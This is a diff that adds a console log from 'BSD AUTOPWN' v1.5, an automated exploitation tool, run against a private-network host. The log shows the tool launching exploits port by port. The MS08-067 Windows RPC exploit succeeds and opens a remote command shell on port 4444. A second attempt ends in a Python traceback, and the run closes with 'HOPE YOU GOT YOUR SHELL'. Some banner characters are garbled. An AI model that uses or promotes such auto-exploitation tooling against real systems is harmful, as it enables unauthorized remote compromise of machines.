@@ -1,0 +1,125 @@
+нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
+                                и BSD  AUTOPWN и                            
+			( Unpolished Sita March 11, 2011 )            
+                                   version 1.5                                
+нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
+ Target HostIP  192.168.1.1
+
+ Target Hostname  192.168.1.1
+
+ Attacker (Your) HostIP  192.168.1.2
+
+ Target CMS Path (if any, eg. /linpha2     /awstats)  
+
+ FTP/CMS Username (optional)  
+
+ FTP/CMS Username (optional)  
+
+Џ Skipping PortScan .. !!
+
+23
+
+№ Launching Exploits for Open Port № 23
+
+
+445
+
+№ Launching Exploits for Open Port № 445
+
+
+ Trying Windows RPC MS08-067 (Win2K3 SP2) Exploit ..
+#######################################################################
+#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
+#   www.hackingspirits.com
+#   www.coffeeandsecurity.com
+#   Email: d3basis.m0hanty @ gmail.com
+#######################################################################
+
+[-]Trying Windows 2000 payload loaded 
+ [-]Trying Windows 2003[SP2] payload loaded 
+[-]Initiating connection
+
+[-]connected to ncacn_np:192.168.1.1[\pipe\browser]
+[-]Exploit sent to target successfully...
+[1]Telnet to port 4444 on target machine...
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32>Connection closed by foreign host.
+
+ Trying Windows RPC MS08-067 (Win2K) Exploit ..
+#######################################################################
+#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
+#   www.hackingspirits.com
+#   www.coffeeandsecurity.com
+#   Email: d3basis.m0hanty @ gmail.com
+#######################################################################
+
+[-]Trying Windows 2000 payload loaded 
+ [-]Trying Windows 2003[SP2] payload loaded 
+[-]Initiating connection
+[-]connected to ncacn_np:192.168.1.1[\pipe\browser]
+Exception in thread Thread-1:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.6/threading.py", line 532, in __bootstrap_inner
+    self.run()
+  File "ms08067-2k2k3.py", line 152, in run
+    self.__DCEPacket()
+  File "ms08067-2k2k3.py", line 127, in __DCEPacket
+    self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
+  File "/usr/local/lib/python2.6/site-packages/impacket/dcerpc/dcerpc.py", line 724, in bind
+    s = self._transport.recv()
+  File "/usr/local/lib/python2.6/site-packages/impacket/dcerpc/transport.py", line 336, in recv
+    s = self.__smb_server.recv_packet()
+  File "/usr/local/lib/python2.6/site-packages/impacket/smb.py", line 1324, in recv_packet
+    r = self.__sess.recv_packet(self.__timeout)
+  File "/usr/local/lib/python2.6/site-packages/impacket/nmb.py", line 687, in recv_packet
+    data = self.__read(timeout)
+  File "/usr/local/lib/python2.6/site-packages/impacket/nmb.py", line 716, in __read
+    received = self.__sock.recv(read_len)
+error: [Errno 54] Connection reset by peer
+
+^C
+1025
+
+№ Launching Exploits for Open Port № 1025
+
+
+1138
+
+№ Launching Exploits for Open Port № 1138
+
+
+2869
+
+№ Launching Exploits for Open Port № 2869
+
+
+3389
+
+№ Launching Exploits for Open Port № 3389
+
+
+8912
+
+№ Launching Exploits for Open Port № 8912
+
+
+55000
+
+№ Launching Exploits for Open Port № 55000
+
+
+56000
+
+№ Launching Exploits for Open Port № 56000
+
+
+  HOPE YOU GOT YOUR SHELL 
+  WINAUTOPWN (WINDOWS AUTOPWN) 
+  Written by Azim Poonawala(quakerdoomer@fmguy.com) 
+
+DIGITAL-TRAITOR# 
